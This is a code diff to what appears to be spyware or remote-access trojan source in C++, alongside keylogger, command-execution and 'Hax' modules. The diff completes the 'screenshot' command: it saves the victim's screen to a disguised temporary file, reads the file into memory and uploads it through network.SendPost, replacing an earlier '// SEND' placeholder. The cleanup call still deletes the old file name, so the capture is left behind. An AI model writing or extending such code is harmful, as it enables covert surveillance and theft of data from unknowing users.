@@ -2,7 +2,9 @@
 #include "CommandExe.h"
 #include "Hax.h"
 #include "Keylogger.h"
+#include "Network.h"
 #include "Screenshot.h"
+#include "Settings.h"
 
 static std::vector<std::string> split(const std::string &s, char delim) {
     std::stringstream ss(s);
@@ -59,24 +61,41 @@ command_t commandDefs[] = {
     },
     {
         "screenshot", [](std::vector<std::string> args) {
-            screenshot.TakeScreenshot(_T("screen.png"));
+
+            static const TCHAR* tmpFile = V_FAKE_TMP1;
+
+            screenshot.TakeScreenshot(tmpFile);
+
 			FILE *fp;
-			errno_t error = fopen_s(&fp, "screen.png", "rb");
-			if(!fp || error) {
-				Error(_T("fopen_s failed"));
+            errno_t error = _tfopen_s(&fp, tmpFile, _T("rb"));
+			if(error != 0) {
+				Error(_T("_tfopen failed"));
 				return;
 			}
+
 			fseek(fp, 0, SEEK_END);
 			size_t size = ftell(fp);
 			fseek(fp, 0, SEEK_SET);
-			char *buffer = new char[size];
-			if(fread_s(buffer, size, 1, size, fp) != size) {
+
+
+			char* buffer = (char*)malloc(size);
+            if (!buffer)
+            {
+                Error(_T("Couldn't allocate buffer"));
+				return;
+            }
+
+			if(fread_s(buffer, size, 1, size, fp) != size)
+            {
 				Error(_T("fread_s did not return size"));
+			    free(buffer);
 				return;
 			}
 			fclose(fp);
-			// SEND
-			delete buffer;
+
+            network.SendPost(buffer, size, false);
+
+			free(buffer);
 			DeleteFile(_T("screen.png"));
         }
     },
